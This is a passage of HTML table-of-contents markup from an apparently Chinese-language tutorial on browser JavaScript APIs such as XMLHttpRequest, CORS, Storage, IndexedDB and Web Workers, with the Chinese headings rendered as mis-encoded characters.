class="toc-number">4.3.3.</span> <span class="toc-text">Secureï¼ŒHttpOnly</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite"><span class="toc-number">4.3.4.</span> <span class="toc-text">SameSite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#document-cookie"><span class="toc-number">4.4.</span> <span class="toc-text">document.cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLHttpRequest-å¯¹è±¡"><span class="toc-number">5.</span> <span class="toc-text">XMLHttpRequest å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ç®€ä»‹"><span class="toc-number">5.1.</span> <span class="toc-text">ç®€ä»‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-çš„å®ä¾‹å±æ€§"><span class="toc-number">5.2.</span> <span class="toc-text">XMLHttpRequest çš„å®ä¾‹å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-readyState"><span class="toc-number">5.2.1.</span> <span class="toc-text">XMLHttpRequest.readyState</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-onreadystatechange"><span class="toc-number">5.2.2.</span> <span class="toc-text">XMLHttpRequest.onreadystatechange</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-response"><span class="toc-number">5.2.3.</span> <span class="toc-text">XMLHttpRequest.response</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseType"><span class="toc-number">5.2.4.</span> <span class="toc-text">XMLHttpRequest.responseType</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseText"><span class="toc-number">5.2.5.</span> <span class="toc-text">XMLHttpRequest.responseText</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseXML"><span class="toc-number">5.2.6.</span> <span class="toc-text">XMLHttpRequest.responseXML</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-responseURL"><span class="toc-number">5.2.7.</span> <span class="toc-text">XMLHttpRequest.responseURL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-statusï¼ŒXMLHttpRequest-statusText"><span class="toc-number">5.2.8.</span> <span class="toc-text">XMLHttpRequest.statusï¼ŒXMLHttpRequest.statusText</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-timeoutï¼ŒXMLHttpRequestEventTarget-ontimeout"><span class="toc-number">5.2.9.</span> <span class="toc-text">XMLHttpRequest.timeoutï¼ŒXMLHttpRequestEventTarget.ontimeout</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#äº‹ä»¶ç›‘å¬å±æ€§"><span class="toc-number">5.2.10.</span> <span class="toc-text">äº‹ä»¶ç›‘å¬å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-withCredentials"><span class="toc-number">5.2.11.</span> <span class="toc-text">XMLHttpRequest.withCredentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-upload"><span class="toc-number">5.2.12.</span> <span class="toc-text">XMLHttpRequest.upload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-çš„å®ä¾‹æ–¹æ³•"><span class="toc-number">5.3.</span> <span class="toc-text">XMLHttpRequest çš„å®ä¾‹æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-open"><span class="toc-number">5.3.1.</span> <span class="toc-text">XMLHttpRequest.open()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-send"><span class="toc-number">5.3.2.</span> <span class="toc-text">XMLHttpRequest.send()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-setRequestHeader"><span class="toc-number">5.3.3.</span> <span class="toc-text">XMLHttpRequest.setRequestHeader()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-overrideMimeType"><span class="toc-number">5.3.4.</span> <span class="toc-text">XMLHttpRequest.overrideMimeType()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-getResponseHeader"><span class="toc-number">5.3.5.</span> <span class="toc-text">XMLHttpRequest.getResponseHeader()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-getAllResponseHeaders"><span class="toc-number">5.3.6.</span> <span class="toc-text">XMLHttpRequest.getAllResponseHeaders()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-abort"><span class="toc-number">5.3.7.</span> <span class="toc-text">XMLHttpRequest.abort()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-å®ä¾‹çš„äº‹ä»¶"><span class="toc-number">5.4.</span> <span class="toc-text">XMLHttpRequest å®ä¾‹çš„äº‹ä»¶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readyStateChange-äº‹ä»¶"><span class="toc-number">5.4.1.</span> <span class="toc-text">readyStateChange äº‹ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#progress-äº‹ä»¶"><span class="toc-number">5.4.2.</span> <span class="toc-text">progress äº‹ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶"><span class="toc-number">5.4.3.</span> <span class="toc-text">load äº‹ä»¶ã€error äº‹ä»¶ã€abort äº‹ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#loadend-äº‹ä»¶"><span class="toc-number">5.4.4.</span> <span class="toc-text">loadend äº‹ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#timeout-äº‹ä»¶"><span class="toc-number">5.4.5.</span> <span class="toc-text">timeout äº‹ä»¶</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-sendBeacon-1"><span class="toc-number">5.5.</span> <span class="toc-text">Navigator.sendBeacon()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#åŒæºé™åˆ¶"><span class="toc-number">6.</span> <span class="toc-text">åŒæºé™åˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-2"><span class="toc-number">6.1.</span> <span class="toc-text">æ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å«ä¹‰"><span class="toc-number">6.1.1.</span> <span class="toc-text">å«ä¹‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç›®çš„"><span class="toc-number">6.1.2.</span> <span class="toc-text">ç›®çš„</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#é™åˆ¶èŒƒå›´"><span class="toc-number">6.1.3.</span> <span class="toc-text">é™åˆ¶èŒƒå›´</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-1"><span class="toc-number">6.2.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-å’Œå¤šçª—å£é€šä¿¡"><span class="toc-number">6.3.</span> <span class="toc-text">iframe å’Œå¤šçª—å£é€šä¿¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ç‰‡æ®µè¯†åˆ«ç¬¦"><span class="toc-number">6.3.1.</span> <span class="toc-text">ç‰‡æ®µè¯†åˆ«ç¬¦</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-postMessage"><span class="toc-number">6.3.2.</span> <span class="toc-text">window.postMessage()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LocalStorage"><span class="toc-number">6.3.3.</span> <span class="toc-text">LocalStorage</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AJAX"><span class="toc-number">6.4.</span> <span class="toc-text">AJAX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP"><span class="toc-number">6.4.1.</span> <span class="toc-text">JSONP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSocket"><span class="toc-number">6.4.2.</span> <span class="toc-text">WebSocket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CORS"><span class="toc-number">6.4.3.</span> <span class="toc-text">CORS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS-é€šä¿¡"><span class="toc-number">7.</span> <span class="toc-text">CORS é€šä¿¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ç®€ä»‹-1"><span class="toc-number">7.1.</span> <span class="toc-text">ç®€ä»‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¸¤ç§è¯·æ±‚"><span class="toc-number">7.2.</span> <span class="toc-text">ä¸¤ç§è¯·æ±‚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç®€å•è¯·æ±‚"><span class="toc-number">7.3.</span> <span class="toc-text">ç®€å•è¯·æ±‚</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#åŸºæœ¬æµç¨‹"><span class="toc-number">7.3.1.</span> <span class="toc-text">åŸºæœ¬æµç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#withCredentials-å±æ€§"><span class="toc-number">7.3.2.</span> <span class="toc-text">withCredentials å±æ€§</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#éç®€å•è¯·æ±‚"><span class="toc-number">7.4.</span> <span class="toc-text">éç®€å•è¯·æ±‚</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢„æ£€è¯·æ±‚"><span class="toc-number">7.4.1.</span> <span class="toc-text">é¢„æ£€è¯·æ±‚</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢„æ£€è¯·æ±‚çš„å›åº”"><span class="toc-number">7.4.2.</span> <span class="toc-text">é¢„æ£€è¯·æ±‚çš„å›åº”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”"><span class="toc-number">7.4.3.</span> <span class="toc-text">æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¸-JSONP-çš„æ¯”è¾ƒ"><span class="toc-number">7.5.</span> <span class="toc-text">ä¸ JSONP çš„æ¯”è¾ƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Storage-æ¥å£"><span class="toc-number">8.</span> <span class="toc-text">Storage æ¥å£</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-3"><span class="toc-number">8.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å±æ€§å’Œæ–¹æ³•"><span class="toc-number">8.2.</span> <span class="toc-text">å±æ€§å’Œæ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-setItem"><span class="toc-number">8.2.1.</span> <span class="toc-text">Storage.setItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-getItem"><span class="toc-number">8.2.2.</span> <span class="toc-text">Storage.getItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-removeItem"><span class="toc-number">8.2.3.</span> <span class="toc-text">Storage.removeItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-clear"><span class="toc-number">8.2.4.</span> <span class="toc-text">Storage.clear()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-key"><span class="toc-number">8.2.5.</span> <span class="toc-text">Storage.key()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#storage-äº‹ä»¶"><span class="toc-number">8.3.</span> <span class="toc-text">storage äº‹ä»¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#History-å¯¹è±¡"><span class="toc-number">9.</span> <span class="toc-text">History å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-4"><span class="toc-number">9.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å±æ€§"><span class="toc-number">9.2.</span> <span class="toc-text">å±æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ–¹æ³•"><span class="toc-number">9.3.</span> <span class="toc-text">æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#History-back-ã€History-forward-ã€History-go"><span class="toc-number">9.3.1.</span> <span class="toc-text">History.back()ã€History.forward()ã€History.go()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#History-pushState"><span class="toc-number">9.3.2.</span> <span class="toc-text">History.pushState()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#History-replaceState"><span class="toc-number">9.3.3.</span> <span class="toc-text">History.replaceState()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popstate-äº‹ä»¶"><span class="toc-number">9.4.</span> <span class="toc-text">popstate äº‹ä»¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Location-å¯¹è±¡ï¼ŒURL-å¯¹è±¡ï¼ŒURLSearchParams-å¯¹è±¡"><span class="toc-number">10.</span> <span class="toc-text">Location å¯¹è±¡ï¼ŒURL å¯¹è±¡ï¼ŒURLSearchParams å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Location-å¯¹è±¡"><span class="toc-number">10.1.</span> <span class="toc-text">Location å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å±æ€§-1"><span class="toc-number">10.1.1.</span> <span class="toc-text">å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ–¹æ³•-1"><span class="toc-number">10.1.2.</span> <span class="toc-text">æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-çš„ç¼–ç å’Œè§£ç "><span class="toc-number">10.2.</span> <span class="toc-text">URL çš„ç¼–ç å’Œè§£ç </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#encodeURI"><span class="toc-number">10.2.1.</span> <span class="toc-text">encodeURI()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#encodeURIComponent"><span class="toc-number">10.2.2.</span> <span class="toc-text">encodeURIComponent()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decodeURI"><span class="toc-number">10.2.3.</span> <span class="toc-text">decodeURI()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decodeURIComponent"><span class="toc-number">10.2.4.</span> <span class="toc-text">decodeURIComponent()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-æ¥å£"><span class="toc-number">10.3.</span> <span class="toc-text">URL æ¥å£</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ„é€ å‡½æ•°"><span class="toc-number">10.3.1.</span> <span class="toc-text">æ„é€ å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å®ä¾‹å±æ€§"><span class="toc-number">10.3.2.</span> <span class="toc-text">å®ä¾‹å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#é™æ€æ–¹æ³•"><span class="toc-number">10.3.3.</span> <span class="toc-text">é™æ€æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLSearchParams-å¯¹è±¡"><span class="toc-number">10.4.</span> <span class="toc-text">URLSearchParams å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ¦‚è¿°-5"><span class="toc-number">10.4.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-toString"><span class="toc-number">10.4.2.</span> <span class="toc-text">URLSearchParams.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-append"><span class="toc-number">10.4.3.</span> <span class="toc-text">URLSearchParams.append()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-delete"><span class="toc-number">10.4.4.</span> <span class="toc-text">URLSearchParams.delete()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-has"><span class="toc-number">10.4.5.</span> <span class="toc-text">URLSearchParams.has()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-set"><span class="toc-number">10.4.6.</span> <span class="toc-text">URLSearchParams.set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-get-ï¼ŒURLSearchParams-getAll"><span class="toc-number">10.4.7.</span> <span class="toc-text">URLSearchParams.get()ï¼ŒURLSearchParams.getAll()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-sort"><span class="toc-number">10.4.8.</span> <span class="toc-text">URLSearchParams.sort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-keys-ï¼ŒURLSearchParams-values-ï¼ŒURLSearchParams-entries"><span class="toc-number">10.4.9.</span> <span class="toc-text">URLSearchParams.keys()ï¼ŒURLSearchParams.values()ï¼ŒURLSearchParams.entries()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ArrayBuffer-å¯¹è±¡ï¼ŒBlob-å¯¹è±¡"><span class="toc-number">11.</span> <span class="toc-text">ArrayBuffer å¯¹è±¡ï¼ŒBlob å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ArrayBuffer-å¯¹è±¡"><span class="toc-number">11.1.</span> <span class="toc-text">ArrayBuffer å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blob-å¯¹è±¡"><span class="toc-number">11.2.</span> <span class="toc-text">Blob å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ç®€ä»‹-2"><span class="toc-number">11.2.1.</span> <span class="toc-text">ç®€ä»‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•"><span class="toc-number">11.2.2.</span> <span class="toc-text">å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#è·å–æ–‡ä»¶ä¿¡æ¯"><span class="toc-number">11.2.3.</span> <span class="toc-text">è·å–æ–‡ä»¶ä¿¡æ¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ä¸‹è½½æ–‡ä»¶"><span class="toc-number">11.2.4.</span> <span class="toc-text">ä¸‹è½½æ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç”Ÿæˆ-URL"><span class="toc-number">11.2.5.</span> <span class="toc-text">ç”Ÿæˆ URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#è¯»å–æ–‡ä»¶"><span class="toc-number">11.2.6.</span> <span class="toc-text">è¯»å–æ–‡ä»¶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-å¯¹è±¡ï¼ŒFileList-å¯¹è±¡ï¼ŒFileReader-å¯¹è±¡"><span class="toc-number">12.</span> <span class="toc-text">File å¯¹è±¡ï¼ŒFileList å¯¹è±¡ï¼ŒFileReader å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-å¯¹è±¡"><span class="toc-number">12.1.</span> <span class="toc-text">File å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ„é€ å‡½æ•°-1"><span class="toc-number">12.1.1.</span> <span class="toc-text">æ„é€ å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-1"><span class="toc-number">12.1.2.</span> <span class="toc-text">å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileList-å¯¹è±¡"><span class="toc-number">12.2.</span> <span class="toc-text">FileList å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileReader-å¯¹è±¡"><span class="toc-number">12.3.</span> <span class="toc-text">FileReader å¯¹è±¡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#è¡¨å•ï¼ŒFormData-å¯¹è±¡"><span class="toc-number">13.</span> <span class="toc-text">è¡¨å•ï¼ŒFormData å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#è¡¨å•æ¦‚è¿°"><span class="toc-number">13.1.</span> <span class="toc-text">è¡¨å•æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FormData-å¯¹è±¡"><span class="toc-number">13.2.</span> <span class="toc-text">FormData å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ¦‚è¿°-6"><span class="toc-number">13.2.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å®ä¾‹æ–¹æ³•"><span class="toc-number">13.2.2.</span> <span class="toc-text">å®ä¾‹æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#è¡¨å•çš„å†…ç½®éªŒè¯"><span class="toc-number">13.3.</span> <span class="toc-text">è¡¨å•çš„å†…ç½®éªŒè¯</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#è‡ªåŠ¨æ ¡éªŒ"><span class="toc-number">13.3.1.</span> <span class="toc-text">è‡ªåŠ¨æ ¡éªŒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkValidity"><span class="toc-number">13.3.2.</span> <span class="toc-text">checkValidity()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#willValidate-å±æ€§"><span class="toc-number">13.3.3.</span> <span class="toc-text">willValidate å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#validationMessage-å±æ€§"><span class="toc-number">13.3.4.</span> <span class="toc-text">validationMessage å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setCustomValidity"><span class="toc-number">13.3.5.</span> <span class="toc-text">setCustomValidity()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#validity-å±æ€§"><span class="toc-number">13.3.6.</span> <span class="toc-text">validity å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#è¡¨å•çš„-novalidate-å±æ€§"><span class="toc-number">13.3.7.</span> <span class="toc-text">è¡¨å•çš„ novalidate å±æ€§</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enctype-å±æ€§"><span class="toc-number">13.4.</span> <span class="toc-text">enctype å±æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ–‡ä»¶ä¸Šä¼ "><span class="toc-number">13.5.</span> <span class="toc-text">æ–‡ä»¶ä¸Šä¼ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IndexedDB-API"><span class="toc-number">14.</span> <span class="toc-text">IndexedDB API</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-7"><span class="toc-number">14.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åŸºæœ¬æ¦‚å¿µ"><span class="toc-number">14.2.</span> <span class="toc-text">åŸºæœ¬æ¦‚å¿µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ“ä½œæµç¨‹"><span class="toc-number">14.3.</span> <span class="toc-text">æ“ä½œæµç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ‰“å¼€æ•°æ®åº“"><span class="toc-number">14.3.1.</span> <span class="toc-text">æ‰“å¼€æ•°æ®åº“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ–°å»ºæ•°æ®åº“"><span class="toc-number">14.3.2.</span> <span class="toc-text">æ–°å»ºæ•°æ®åº“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ–°å¢æ•°æ®"><span class="toc-number">14.3.3.</span> <span class="toc-text">æ–°å¢æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#è¯»å–æ•°æ®"><span class="toc-number">14.3.4.</span> <span class="toc-text">è¯»å–æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#éå†æ•°æ®"><span class="toc-number">14.3.5.</span> <span class="toc-text">éå†æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ›´æ–°æ•°æ®"><span class="toc-number">14.3.6.</span> <span class="toc-text">æ›´æ–°æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#åˆ é™¤æ•°æ®"><span class="toc-number">14.3.7.</span> <span class="toc-text">åˆ é™¤æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ä½¿ç”¨ç´¢å¼•"><span class="toc-number">14.3.8.</span> <span class="toc-text">ä½¿ç”¨ç´¢å¼•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#indexedDB-å¯¹è±¡"><span class="toc-number">14.4.</span> <span class="toc-text">indexedDB å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-open"><span class="toc-number">14.4.1.</span> <span class="toc-text">indexedDB.open()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-deleteDatabase"><span class="toc-number">14.4.2.</span> <span class="toc-text">indexedDB.deleteDatabase()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-cmp"><span class="toc-number">14.4.3.</span> <span class="toc-text">indexedDB.cmp()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBRequest-å¯¹è±¡"><span class="toc-number">14.5.</span> <span class="toc-text">IDBRequest å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBDatabase-å¯¹è±¡"><span class="toc-number">14.6.</span> <span class="toc-text">IDBDatabase å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å±æ€§-2"><span class="toc-number">14.6.1.</span> <span class="toc-text">å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ–¹æ³•-2"><span class="toc-number">14.6.2.</span> <span class="toc-text">æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBObjectStore-å¯¹è±¡"><span class="toc-number">14.7.</span> <span class="toc-text">IDBObjectStore å¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å±æ€§-3"><span class="toc-number">14.7.1.</span> <span class="toc-text">å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ–¹æ³•-3"><span class="toc-number">14.7.2.</span> <span class="toc-text">æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBTransaction-å¯¹è±¡"><span class="toc-number">14.8.</span> <span class="toc-text">IDBTransaction å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBIndex-å¯¹è±¡"><span class="toc-number">14.9.</span> <span class="toc-text">IDBIndex å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBCursor-å¯¹è±¡"><span class="toc-number">14.10.</span> <span class="toc-text">IDBCursor å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBKeyRange-å¯¹è±¡"><span class="toc-number">14.11.</span> <span class="toc-text">IDBKeyRange å¯¹è±¡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Worker"><span class="toc-number">15.</span> <span class="toc-text">Web Worker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-8"><span class="toc-number">15.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åŸºæœ¬ç”¨æ³•"><span class="toc-number">15.2.</span> <span class="toc-text">åŸºæœ¬ç”¨æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ä¸»çº¿ç¨‹"><span class="toc-number">15.2.1.</span> <span class="toc-text">ä¸»çº¿ç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-çº¿ç¨‹"><span class="toc-number">15.2.2.</span> <span class="toc-text">Worker çº¿ç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-åŠ è½½è„šæœ¬"><span class="toc-number">15.2.3.</span> <span class="toc-text">Worker åŠ è½½è„šæœ¬</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#é”™è¯¯å¤„ç†"><span class="toc-number">15.2.4.</span> <span class="toc-text">é”™è¯¯å¤„ç†</span></a></li><li 